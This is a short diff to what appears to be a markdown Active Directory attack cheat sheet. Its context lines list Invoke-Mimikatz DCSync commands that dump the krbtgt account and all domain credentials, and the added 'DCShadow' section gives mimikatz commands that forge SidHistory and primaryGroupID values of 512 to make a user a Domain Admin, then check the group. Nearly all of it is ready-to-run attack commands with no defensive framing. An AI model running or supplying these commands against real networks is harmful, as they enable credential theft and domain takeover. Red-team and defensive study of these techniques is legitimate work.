@@ -81,4 +81,11 @@ Invoke-Mimikatz -command '"lsadump::dcsync /user:ins0mnia\krbtgt"'
 Invoke-Mimikatz -command '"lsadump::dcsync /domain:insomnia.io /all /csv"'
 Invoke-Mimikatz -command '"lsadump::dcsync /domain:ins0mnia /user:john"'
 ```
-
+### DCShadow
+```
+!ProcessToken
+lsadump::dcshadow /object:"CN=BobT,OU=Employees,DC=sub,DC=domain,DC=com" /attribute:SidHistory /value:512
+lsadump::dcshadow /object:POC User5 /attribute:primaryGroupID /value:512
+lsadump::dcshadow /push
+net group "Domain Admins" /domain
+```
